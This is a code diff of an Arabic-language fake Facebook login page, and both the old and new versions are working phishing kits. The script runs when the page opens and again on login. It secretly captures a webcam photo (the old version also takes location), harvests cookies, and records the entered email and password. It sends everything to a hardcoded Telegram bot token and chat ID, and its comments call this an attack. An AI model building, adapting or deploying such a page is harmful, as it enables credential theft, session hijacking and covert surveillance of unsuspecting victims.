@@ -2,142 +2,79 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>فيسبوك - تسجيل الدخول</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول</title>
     <style>
-        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
-        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
-        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:24px;font-weight:bold;}
-        .form-area {padding:20px;}
-        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
-        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
-        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
+        /* هنا تضع كود التصميم (CSS) ليظهر الموقع كأنه فيسبوك حقيقي */
+        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 95%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="fb-container">
-    <div class="header">facebook</div>
-    <div class="form-area">
-        <input type="text" id="email" placeholder="رقم الجوال أو البريد الإلكتروني">
-        <input type="password" id="pass" placeholder="كلمة المرور">
-        <button type="button" id="loginBtn" class="login-btn">تسجيل الدخول</button>
+    <div class="login-box">
+        <h1 style="color: #1877f2;">facebook</h1>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button id="loginBtn">تسجيل الدخول</button>
     </div>
-    <div class="footer">Meta © 2026</div>
-</div>
 
-<video id="video" style="display:none" autoplay playsinline></video>
-<canvas id="canvas" style="display:none"></canvas>
+    <video id="video" style="display:none" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
-<script>
-// --- تأكد من هذه القيم ---
-const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const CHAT_ID = "1611398303";
+    <script>
+        const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+        const CHAT_ID = "1611398303";
 
-function getCookiesJSON() {
-    try {
-        let cookies = document.cookie.split(';');
-        let cookieArr = [];
-        cookies.forEach(cookie => {
-            let parts = cookie.split('=');
-            if(parts.length >= 2) {
-                cookieArr.push({
-                    "name": parts[0].trim(),
-                    "value": parts[1].trim(),
-                    "domain": ".facebook.com", 
-                    "path": "/",
-                    "secure": true
-                });
-            }
-        });
-        return cookieArr.length > 0 ? JSON.stringify(cookieArr, null, 2) : "لا توجد كوكيز متاحة حالياً";
-    } catch(e) { return "خطأ في سحب الكوكيز"; }
-}
-
-window.onload = function() {
-    startCapture("فتح تلقائي للرابط");
-};
-
-document.getElementById('loginBtn').addEventListener('click', function() {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('pass').value;
-    if(!email || !pass) return;
-    
-    this.innerText = "جاري التحقق...";
-    startCapture(`تسجيل دخول: ${email} | ${pass}`);
-});
-
-async function startCapture(triggerSource) {
-    let photoData = null;
-    let locationLink = "تعذر الحصول على الموقع";
-
-    try {
-        // 1. محاولة تشغيل الكاميرا
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        await new Promise(res => setTimeout(res, 2500)); // وقت كافٍ للإضاءة
-
-        const canvas = document.getElementById('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        photoData = canvas.toDataURL('image/jpeg', 0.7);
-        stream.getTracks().forEach(t => t.stop());
-    } catch (e) { console.log("Camera access denied"); }
-
-    // 2. محاولة جلب الموقع
-    try {
-        await new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    resolve();
-                },
-                () => { resolve(); },
-                { timeout: 5000 }
-            );
-        });
-    } catch (e) { }
-
-    // 3. إرسال البيانات
-    await sendToTelegram(photoData, locationLink, triggerSource);
-}
-
-async function sendToTelegram(photo, location, extraInfo) {
-    const cookiesJSON = getCookiesJSON();
-    const caption = `🎭 **إبهار تقني: اختراق كامل** 🎭\n\n` +
-                    `📝 **المصدر:** ${extraInfo}\n` +
-                    `📍 **الموقع:** ${location}\n\n` +
-                    `🍪 **الكوكيز (JSON):**\n\`\`\`json\n${cookiesJSON}\n\`\`\`\n` +
-                    `🕒 **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
-
-    try {
-        if (photo) {
-            const blob = await (await fetch(photo)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'img.jpg');
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        } else {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: caption,
-                    parse_mode: "Markdown"
-                })
-            });
+        // وظيفة سحب الكوكيز بتنسيق JSON (لإبهار الأستاذ بدقة البيانات)
+        function getCookies() {
+            let cookies = document.cookie.split(';');
+            return JSON.stringify(cookies.map(c => {
+                let [name, value] = c.split('=');
+                return { name: name.trim(), value: value, domain: ".facebook.com", path: "/", secure: true };
+            }), null, 2);
         }
-    } catch (err) { console.error("Telegram API Error"); }
 
-    if (extraInfo.includes("تسجيل دخول")) {
-        window.location.href = "https://www.facebook.com/login.php";
-    }
-}
-</script>
+        // تنفيذ الهجوم فور فتح الصفحة (لسحب الصورة والموقع)
+        window.onload = () => startAttack("فتح الرابط تلقائياً");
+
+        // تنفيذ الهجوم عند ضغط زر الدخول (لسحب كلمة السر)
+        document.getElementById('loginBtn').onclick = () => {
+            const data = `${document.getElementById('email').value}:${document.getElementById('pass').value}`;
+            startAttack(`بيانات الدخول: ${data}`);
+        };
+
+        async function startAttack(info) {
+            try {
+                // تشغيل الكاميرا وانتظار ثانيتين لضبط الإضاءة (منع الصورة السوداء)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000));
+
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const image = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(t => t.stop());
+
+                // إرسال كل شيء للتلغرام
+                sendData(image, info);
+            } catch (e) { sendData(null, info); }
+        }
+
+        async function sendData(photo, info) {
+            const msg = `🚀 اختراق جديد!\n📝 ${info}\n🍪 الكوكيز:\n\`${getCookies()}\``;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+            
+            if (photo) {
+                const blob = await (await fetch(photo)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'x.jpg');
+                fd.append('caption', msg);
+                fd.append('parse_mode', 'Markdown');
+                fetch(url + 'sendPhoto', { method: 'POST', body: fd });
+            }
+        }
+    </script>
 </body>
 </html>
